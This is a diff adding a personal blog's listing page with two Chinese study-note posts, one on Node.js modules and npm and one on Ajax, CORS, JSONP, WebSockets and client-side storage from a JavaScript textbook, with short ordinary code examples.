+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-15T00:00:00+08:00">
+                2018-06-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="第1章-NODE简介"><a href="#第1章-NODE简介" class="headerlink" title="第1章 NODE简介"></a>第1章 NODE简介</h1><h2 id="Node的特点"><a href="#Node的特点" class="headerlink" title="Node的特点"></a>Node的特点</h2><h3 id="异步I-O"><a href="#异步I-O" class="headerlink" title="异步I/O"></a>异步I/O</h3><h3 id="事件驱动与回调函数"><a href="#事件驱动与回调函数" class="headerlink" title="事件驱动与回调函数"></a>事件驱动与回调函数</h3><h3 id="单线程"><a href="#单线程" class="headerlink" title="单线程"></a>单线程</h3><h3 id="跨平台"><a href="#跨平台" class="headerlink" title="跨平台"></a>跨平台</h3><h1 id="第2章-模块机制"><a href="#第2章-模块机制" class="headerlink" title="第2章 模块机制"></a>第2章 模块机制</h1><h3 id="CommonJS的模块规范"><a href="#CommonJS的模块规范" class="headerlink" title="CommonJS的模块规范"></a>CommonJS的模块规范</h3><ol>
+<li><p>模块引用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var math = require(&apos;math&apos;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>模块定义</p>
+</li>
+</ol>
+<ul>
+<li>exports对象用于导出当前模块的方法或变量</li>
+<li>module对象代表模块自身，exports是module的一个属性<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module.exports = variable;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ol start="3">
+<li>模块标识：</li>
+</ol>
+<ul>
+<li>模块的意义在于将类聚的方法和变量等限定在私有的作用域中（避免污染），同时支持引入和导出功能以顺畅地连接上下游依赖</li>
+</ul>
+<h2 id="Node的模块实现"><a href="#Node的模块实现" class="headerlink" title="Node的模块实现"></a>Node的模块实现</h2><ol>
+<li>Node中引入模块需要经历如下三个步骤</li>
+</ol>
+<ul>
+<li>路径分析</li>
+<li>文件定位</li>
+<li>编译执行</li>
+</ul>
+<ol start="2">
+<li>模块分类：核心模块、文件模块（用户自定义）</li>
+</ol>
+<h3 id="优先从缓存加载"><a href="#优先从缓存加载" class="headerlink" title="优先从缓存加载"></a>优先从缓存加载</h3><h3 id="路径分析和文件定位"><a href="#路径分析和文件定位" class="headerlink" title="路径分析和文件定位"></a>路径分析和文件定位</h3><ol>
+<li>模块标识符分析</li>
+<li>文件定位</li>
+</ol>
+<ul>
+<li>CommonJS模块规范允许在标识符中不包含文件扩展名，Node会按.js、.json、.node的次序补足扩展名，依次尝试</li>
+<li>.node和.json文件在传递给require()的标识符中应带上扩展名，这样可加快一点速度</li>
+</ul>
+<h3 id="模块编译"><a href="#模块编译" class="headerlink" title="模块编译"></a>模块编译</h3><ol>
+<li>处理方法</li>
+</ol>
+<ul>
+<li>.js文件：通过fs模块同步读取文件后编译执行</li>
+<li>.node：这是用C/C++编写的扩展文件，通过dlopen()方法加载最后编译生成的文件</li>
+<li>.json：通过fs模块同步读取文件后，用JSON.parse()解析返回结果</li>
+<li>其余扩展名文件：都被当做.js文件载入</li>
+</ul>
+<ol start="2">
+<li>exports对象通过形参的方式传入，因此不能改变作用域外的值。如果要引入一个类的效果，请使用module.exports对象输出</li>
+</ol>
+<h2 id="核心模块"><a href="#核心模块" class="headerlink" title="核心模块"></a>核心模块</h2><h3 id="核心模块的引入流程"><a href="#核心模块的引入流程" class="headerlink" title="核心模块的引入流程"></a>核心模块的引入流程</h3><ul>
+<li>NODE_MODULE（node_os,reg_func）(C/C++层面的内建模块定义)</li>
+<li>get_builtin_module(“node_os”) （C/C++层面的内建模块定义）</li>
+<li>process.binding(“os”) （JavaScript核心模块的定义）</li>
+<li>NativeModule.require(“os”) （JavaScript核心模块的引入）</li>
+<li>require(“os”)  （JavaScript文件模块层面的引入）</li>
+</ul>
+<h2 id="C-C-扩展模块"><a href="#C-C-扩展模块" class="headerlink" title="C/C++扩展模块"></a>C/C++扩展模块</h2><ol>
+<li>预先编译为.node文件，然后调用process.dlopen()方法加载执行</li>
+<li>构造C/C++扩展模块与内建模块的套路一样，将<strong>方法挂载在target对象上</strong>，然后通过NODE_MODULE声明即可<h2 id="2-5-模块调用栈"><a href="#2-5-模块调用栈" class="headerlink" title="2.5 模块调用栈"></a>2.5 模块调用栈</h2></li>
+<li>C/C++内建模块属于最底层，提供API给JavaScript核心模块和第三方JavaScript文件模块调用。实践中应<strong>尽量避免通过process.binding()方法直接调用</strong></li>
+<li>JavaScript核心模块，一类是作为内建模块的封装层和桥接层，供文件模块调用，另一类是纯粹的功能模块</li>
+<li>文件模块由第三方编写，包括普通JavaScript模块和C/C++扩展模块</li>
+</ol>
+<h2 id="包与NPM"><a href="#包与NPM" class="headerlink" title="包与NPM"></a>包与NPM</h2><h3 id="包结构"><a href="#包结构" class="headerlink" title="包结构"></a>包结构</h3><ol>
+<li>包实际上是一个存档文件，即一个目录直接打包为.zip或tar.gz格式的文件，安装后解压还原为目录。完全符合CommonJS规范的包目录应该包含如下文件：</li>
+</ol>
+<ul>
+<li>package.json：包描述文件</li>
+<li>bin：存放可执行二进制文件的目录</li>
+<li>lib：存放JavaScript代码的目录</li>
+<li>doc：存放文档的目录</li>
+<li>test：存放单元测试用例的代码</li>
+</ul>
+<h3 id="包描述文件与NPM"><a href="#包描述文件与NPM" class="headerlink" title="包描述文件与NPM"></a>包描述文件与NPM</h3><ol>
+<li>包描述文件就是package.json，其中最重要的必需字段是dependencies，指使用当前包所需要依赖的包列表，例如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;dependencies&quot;:&#123;</span><br><span class="line">        &quot;koa&quot; : &quot;2.0.0&quot;,</span><br><span class="line">        &quot;koa-bodyparser&quot;: &quot;3.2.0&quot;,</span><br><span class="line">        &quot;koa-router&quot;: &quot;7.0.0&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="NPM常用功能"><a href="#NPM常用功能" class="headerlink" title="NPM常用功能"></a>NPM常用功能</h3><ol>
+<li>借助NPM，可以帮助用户快速安装和管理依赖包</li>
+</ol>
+<ul>
+<li>安装依赖包：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 务必记得切换当前目录</span><br><span class="line">C:\...\hello-koa&gt; npm install koa@2.0.0</span><br><span class="line">C:\...\hello-koa&gt; npm install express</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/06/15/1-nodejs/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-date">
+			<div class="post-month">05月</div>
+			<div class="post-day">17</div>
+	</div>
+  
+
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/17/4-js/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/kekelovely.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KeKeHome">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/05/17/4-js/" itemprop="url">「JavaScript高级程序设计」 第21-23章</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-17T00:00:00+08:00">
+                2018-05-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>主要是把原来做的笔记放在博客上保存归档，供以后使用，正所谓好记性不如烂笔头</p>
+</blockquote>
+<h1 id="JavaScript高级程序设计"><a href="#JavaScript高级程序设计" class="headerlink" title="JavaScript高级程序设计"></a>JavaScript高级程序设计</h1><h2 id="第21章-Ajax与Comet"><a href="#第21章-Ajax与Comet" class="headerlink" title="第21章 Ajax与Comet"></a>第21章 Ajax与Comet</h2><ol>
+<li>Ajax = Asynchronous JavaScipt + XML</li>
+<li>核心是XMLHttpRequest对象，简称XHR</li>
+<li>好处是能够向服务器请求额外的数据而无需卸载页面<h3 id="XMLHttpRequest对象"><a href="#XMLHttpRequest对象" class="headerlink" title="XMLHttpRequest对象"></a>XMLHttpRequest对象</h3></li>
+<li>老版本IE中可能存在三种不同版本的XHR对象：MSXML2.XMLHttp、MSXML2.XMLHttp.3.0、MSXML2.XMLHttp.6.0</li>
+<li>IE7及其他浏览器中均支持原生的XHR对象<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var xhr = new XMLHttpRequest();</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="XHR的用法"><a href="#XHR的用法" class="headerlink" title="XHR的用法"></a>XHR的用法</h4><ol>
+<li><p>调用和发送请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xhr.open(&quot;get&quot;,&quot;example.php&quot;,false); // 布尔值表示是否异步发送请求</span><br><span class="line">xhr.send(null); // send()方法接收一个参数，即要作为请求主体发送的数据</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>收到响应后，响应的数据会自动填充XHR对象的属性</p>
+</li>
+</ol>
+<ul>
+<li>responseText</li>
+<li>responseXML</li>
+<li>status</li>
+<li>statusText</li>
+</ul>
+<ol start="3">
+<li>收到响应前可以使用abort()方法取消异步请求<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.about();</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="HTTP头部信息"><a href="#HTTP头部信息" class="headerlink" title="HTTP头部信息"></a>HTTP头部信息</h4><ol>
+<li><p>setRequestHeader()方法可以设置自定义的请求头部信息，接收两个参数，头部字段的名称和头部字段的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.setRequestHeader(&quot;MyHeader&quot;,&quot;MyValue&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>响应头部信息的取得</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var myHeader = xhr.getResponseHeader(&quot;MyHeader&quot;);</span><br><span class="line">var allHeaders = xhr.getAllResponseHeaders();</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><ol>
+<li>GET是最常见的请求类型，用于向服务器查询某些信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 初始化请求</span><br><span class="line">xhr.open(&quot;get&quot;,url,false);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><ol>
+<li>使用频率仅次于GET的是POST请求，用于向服务器发送应该被保存的数据<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 初始化请求</span><br><span class="line">xhr.open(&quot;post&quot;,&quot;example.php&quot;,true);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="XHR2级"><a href="#XHR2级" class="headerlink" title="XHR2级"></a>XHR2级</h3><h4 id="FormData"><a href="#FormData" class="headerlink" title="FormData"></a>FormData</h4><ol>
+<li><p>FormData为序列化表单以及创建与表单格式相同的数据（用于通过XHR传输）提供了便利</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var data = new FormData();</span><br><span class="line">data.append(&quot;name&quot;,&quot;Nicholas&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>或者用表单元素的数据预先向其中填入键值对</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var data = new FormData(document.forms[0]);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建FormData实例后，可以将它直接传给XHR的send()方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var form = document.getElementById(&quot;user-info&quot;);</span><br><span class="line">xhr.send(new FormData(form));</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="超时设定"><a href="#超时设定" class="headerlink" title="超时设定"></a>超时设定</h4><ol>
+<li>IE8为XHR对象添加了一个timeout属性，表示请求在等待响应多少毫秒之后就终止。如果规定时间内服务器没有接收到响应，那么就触发timeout事件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xhr.timeout = 1000; // 超时设置为1秒钟</span><br><span class="line">xhr.ontimeout = function()&#123;</span><br><span class="line">    alert(&quot;Request did not return in a second.&quot;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="overrideMimeType-方法"><a href="#overrideMimeType-方法" class="headerlink" title="overrideMimeType()方法"></a>overrideMimeType()方法</h4><ol>
+<li>Firefox等浏览器引入了overrideMimeType()方法，用于重写XHR响应的MIME类型<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.overrideMimeType(&quot;text/xml&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="进度事件"><a href="#进度事件" class="headerlink" title="进度事件"></a>进度事件</h3><ul>
+<li>loadstart</li>
+<li>progress</li>
+<li>error</li>
+<li>abort</li>
+<li>load</li>
+<li>loadend</li>
+</ul>
+<ol>
+<li>每个请求都从触发loadstart事件开始，接下来是一个或多个progress事件，然后触发error/abort/load事件中的一个，最后以触发loadend事件结束<h4 id="load事件"><a href="#load事件" class="headerlink" title="load事件"></a>load事件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xhr.onload = function()&#123;</span><br><span class="line">        //</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="progress事件"><a href="#progress事件" class="headerlink" title="progress事件"></a>progress事件</h4><ol>
+<li>onprogress事件处理程序会接收到一个event对象，其target属性是XHR对象，但包含额外的三个属性</li>
+</ol>
+<ul>
+<li>lengthComputable：进度信息是否可用的布尔值</li>
+<li>position：已经接收的字节数</li>
+<li>totalSize：根据Content-Length响应头部确定的预期字节数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 为用户创建一个进度指示器</span><br><span class="line">xhr.onprogress = function(event)&#123;</span><br><span class="line">    var divStatus = document.getElementById(&quot;status&quot;);</span><br><span class="line">    if (event.lengthComputable)&#123;</span><br><span class="line">        divStatus.innerHTML = &quot;Received&quot; + event.position + &quot;of&quot; + event.totalSize + &quot;bytes&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="跨域资源共享"><a href="#跨域资源共享" class="headerlink" title="跨域资源共享"></a>跨域资源共享</h3><ol>
+<li>CORS（Cross-Origin Resouce Sharing，跨域资源共享）定义了在必须访问跨域资源时，浏览器与服务器应该如何沟通。即使用自定义的HTTP头部，决定请求或响应应该成功还是失败。</li>
+<li><p>在发送请求时，需要附加一个额外的Origin头部</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin: http:// www.nczonline.net</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果服务器接收这个请求，就在Access-Control-Allow-Origin头部中回发相同信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://www.nczonline.net</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="IE对CORS的实现"><a href="#IE对CORS的实现" class="headerlink" title="IE对CORS的实现"></a>IE对CORS的实现</h4><ol>
+<li>引入了XDR类型实现跨域通信，操作方式与XHR基本类似<h4 id="其他浏览器对CORS的实现"><a href="#其他浏览器对CORS的实现" class="headerlink" title="其他浏览器对CORS的实现"></a>其他浏览器对CORS的实现</h4></li>
+<li>要请求位于另一个域中的资源，使用标准的XHR对象，并在open()方法中传入绝对URL即可：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.open(&quot;get&quot;,&quot;http://www.somewhere-else.com/page/&quot;,true);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="Preflighted-Requests"><a href="#Preflighted-Requests" class="headerlink" title="Preflighted Requests"></a>Preflighted Requests</h4><ol>
+<li>CORS通过一种叫做Preflighted Requests的透明服务器验证机制支持开发人员使用自定义的头部信息：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Request-Headers:NCZ</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="带凭据的请求"><a href="#带凭据的请求" class="headerlink" title="带凭据的请求"></a>带凭据的请求</h4><ol>
+<li>默认情况下，跨域请求不提供凭据（cookie，HTTP认证以及客户端SSL证明）</li>
+<li>通过将withCredentials属性设置为true，可以指定某个请求应该发送凭据。<h4 id="跨浏览器的CORS"><a href="#跨浏览器的CORS" class="headerlink" title="跨浏览器的CORS"></a>跨浏览器的CORS</h4></li>
+<li>检查是否存在withCredentials属性</li>
+<li>再结合检测XDomainRequest对象是否存在<h3 id="其他跨域技术"><a href="#其他跨域技术" class="headerlink" title="其他跨域技术"></a>其他跨域技术</h3><h4 id="图像ping"><a href="#图像ping" class="headerlink" title="图像ping"></a>图像ping</h4></li>
+<li>与服务器进行简单、单向跨域通信，常用于跟踪用户点击页面或动态广告曝光次数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img.src = &quot;http://www.example.com/test?name=Nicolas&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><ol>
+<li>JSON with padding，由回调函数和数据组成。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var script = document.createElement(&quot;script);</span><br><span class="line">// 回调函数是handleResponse()</span><br><span class="line">script.src = &quot;http://freegeoip.net/json/?callback=handleResponse&quot;;</span><br><span class="line">document.body.insertBefore(script,document.body.firstChild);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="Comet"><a href="#Comet" class="headerlink" title="Comet"></a>Comet</h4><ol>
+<li>Comet是一种服务器向页面推送数据的技术</li>
+<li>长轮询实现</li>
+<li>HTTP流实现<h4 id="服务器发送事件"><a href="#服务器发送事件" class="headerlink" title="服务器发送事件"></a>服务器发送事件</h4></li>
+<li>SSE = Server-Sent Event是围绕只读Comet交互推出的API或模式</li>
+</ol>
+<ul>
+<li><p>SSE API:要预定新的事件流，首先要创建一个新的EventSource对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var source = new EventSource(&quot;myevents.php&quot;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>事件流：服务器事件会通过一个持久的HTTP响应发送，这个响应的MIME类型为text/event-stream</p>
+<h4 id="Web-Sockets"><a href="#Web-Sockets" class="headerlink" title="Web Sockets"></a>Web Sockets</h4></li>
+</ul>
+<ol>
+<li>在一个单独的持久连接上提供全双工、双向通信，建立的连接会从HTTP协议交换为Web Sockets协议</li>
+<li>Web Sockets API</li>
+</ol>
+<ul>
+<li><p>创建一个实例对象并传入要连接的URL：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 创建WebSocket对象</span><br><span class="line">var socket = new WebSocket(&quot;ws://www.example.com/server.php&quot;);</span><br><span class="line">// 关闭连接</span><br><span class="line">socket.close();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>发送和接收数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socket.send(&quot;Hello World!&quot;);</span><br><span class="line">// 对于非纯文本数据，在发送前应当序列化为JSON字符串</span><br><span class="line">socket.send(JSON.stringify(message));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>处理数据。服务器返回的数据保存在event.data属性中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">socket.onmessage = function(event)&#123;</span><br><span class="line">    var data = event.data;</span><br><span class="line">    // 处理data</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>其他事件：open/error/close</p>
+<h4 id="SSE与Web-Sockets"><a href="#SSE与Web-Sockets" class="headerlink" title="SSE与Web Sockets"></a>SSE与Web Sockets</h4><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3></li>
+</ul>
+<ol>
+<li>Ajax是无需刷新页面就能从服务器取得数据的一种方法</li>
+</ol>
+<ul>
+<li>核心对象是XHR-XMLHttpRequest对象</li>
+<li>同源策略是对XHR的一个主要约束，除非使用CORS或IE中的XDomainRequest对象实现跨域资源访问</li>
+</ul>
+<ol start="2">
+<li>Comet是对Ajax的进一步扩展，让服务器几乎能实时向客户端推送数据，实现Comet可通过长轮询和HTTP流做到，SSE是一种实现Comet交互的浏览器AIP，支持长轮询，也支持HTTP流</li>
+<li>Web Sockets是一种与服务器进行全双工、双向通信的信道</li>
+</ol>
+<h1 id="JavaScript高级程序设计-1"><a href="#JavaScript高级程序设计-1" class="headerlink" title="JavaScript高级程序设计"></a>JavaScript高级程序设计</h1><h2 id="第22章-高级技巧-小结"><a href="#第22章-高级技巧-小结" class="headerlink" title="第22章 高级技巧 小结"></a>第22章 高级技巧 小结</h2><ol>
+<li>创建作用域安全的构造函数，确保在缺少new操作符时调用构造函数不会改变错误的环境对象</li>
+</ol>
+<ul>
+<li>使用惰性载入函数，将任何代码分支推迟到第一次调用函数的时候</li>
+<li>函数绑定可让你创建始终在指定环境中运行的函数，同时函数柯里化让你创建已经填写了某些参数的函数</li>
+<li>绑定与柯里化结合，允许你在一种任意环境中以任意参数执行任意函数</li>
+</ul>
+<ol start="2">
+<li>ECMAScript 5 允许通过以下方式来创建防篡改对象</li>
+</ol>
+<ul>
+<li>不可扩展的对象：不允许添加新的属性或方法</li>
+<li>密封的对象：不允许删除已有的属性和方法</li>
+<li>冻结的对象，不允许重写对象成员</li>
+</ul>
+<ol start="3">
+<li>js中可以用setTimeout()和setInterval()创建定时器</li>
+</ol>
+<ul>
+<li>定时器代码放在一个等待区域，待时间间隔到了之后，将代码添加到js的处理队列中，等待下一次js进程空闲时被执行</li>
+<li>每次一段代码执行结束之后，都会有一小段空闲时间进行其他浏览器处理</li>
+<li>可以用定时器将长时间运行的脚本分为一小块可以在以后运行的代码段，这种做法有助于Web应用对用户交互有更积极的响应</li>
+</ul>
+<ol start="4">
+<li>js中经常以事件的形式应用观察者模式，虽然事件常常和DOM一起使用，但你也可通过自定义事件在自己的代码中应用。</li>
+<li>拖放在js中可以用鼠标事件和一些简单的计算来实现。<h2 id="第23章-离线应用与客户端存储"><a href="#第23章-离线应用与客户端存储" class="headerlink" title="第23章   离线应用与客户端存储"></a>第23章   离线应用与客户端存储</h2><h3 id="数据存储"><a href="#数据存储" class="headerlink" title="数据存储"></a>数据存储</h3></li>
+<li>目的：属于某个特定用户的信息应该直接存在于该用户的机器上。时至今日，cookie只是在客户端存储数据的其中一种选项。<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4></li>
+<li><p>服务器对任意HTTP请求发送Set-Cookie HTTP头作为响应的一部分，其中包含会话信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 服务器的响应，名称和值必须都是URL编码</span><br><span class="line">Set-Cookie: name=value</span><br><span class="line">// 浏览器将信息发回</span><br><span class="line">Cookie:name=value</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Cookie的构成</p>
+</li>
+</ol>
+<ul>
+<li>名称：必须URL编码</li>
+<li>值：必须URL编码</li>
+<li>域</li>
+<li>路径</li>
+<li>失效时间</li>
+<li>安全标志：指定后，只有使用SSL链接时才能发送到服务器，即只能发送到<a href="https://www.wrox.com，而不能发送到http://www.wrox.com" target="_blank" rel="noopener">https://www.wrox.com，而不能发送到http://www.wrox.com</a></li>
+</ul>
+<ol start="3">
+<li><p>在JavaScript中处理Cookie值时，必须经过URL解码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = encodeURIComponent(&quot;name&quot;)+&quot;=&quot;+encodeURIComponent(&quot;Nicolas&quot;)+&quot;;domain=.wrox.com;path=/&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>cookie的性质和它的局限使得其并不能作为存储大量信息的理想手段，所以又出现了其他方法。</p>
+<h4 id="IE用户数据"><a href="#IE用户数据" class="headerlink" title="IE用户数据"></a>IE用户数据</h4><h4 id="Web存储机制"><a href="#Web存储机制" class="headerlink" title="Web存储机制"></a>Web存储机制</h4></li>
+<li>Storage类型</li>
+<li>sessionStorage对象</li>
+<li>globalStorage对象</li>
+<li>localStorage对象</li>
+<li>storage事件</li>
+<li>限制<h4 id="IndexedDB"><a href="#IndexedDB" class="headerlink" title="IndexedDB"></a>IndexedDB</h4></li>
+<li>是在浏览器中保存结构化数据的一种数据库，思想是创建一套API，方便保存和读取JavaScript对象，同时还支持查询及搜索</li>
+</ol>
+<ul>
+<li>数据库</li>
+<li>对象存储空间</li>
+<li>事务</li>
+<li>使用游标查询</li>
+<li>键范围</li>
+<li>设定游标方向</li>
+<li>索引</li>
+<li>并发问题</li>
+<li>限制<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3></li>
+</ul>
+<ol>
+<li>本书讨论了客户端存储的以下内容</li>
+</ol>
+<ul>
+<li>以前，这种存储只能用cookie完成。cookie是一小块可以在客户端也可以在服务器端设置的信息，每次发起请求时都会传送它</li>
+<li>在js中通过document.cookie可以访问cookie</li>
+<li>cookie的限制使其可以存储少量数据，然而对大量数据效率很低</li>
+</ul>
+<ol start="2">
+<li>IE发明了一种叫用户数据的行为，可以应用到页面的某个元素上</li>
+</ol>
+<ul>
+<li>该元素可从一个命名数据空间中载入数据，通过getAttribute()，setAttribute()，removeAttribute()访问</li>
+<li>数据必须明确使用save()方法保存到命名数据空间中，以便在会话间持久化数据</li>
+</ul>
+<ol start="3">
+<li>Web Storage定义了两种用于存储数据的对象：sessionStorage和localStorage，前者严格用于在一个浏览器会话中存储数据，因为数据在浏览器关闭后会立即删除，后者用于跨会话持久化数据并遵循跨域安全策略。</li>
+<li>IndexDB是一种类似SQL数据库的结构化数据存储机制。</li>
+</ol>
+
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/05/17/4-js/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+
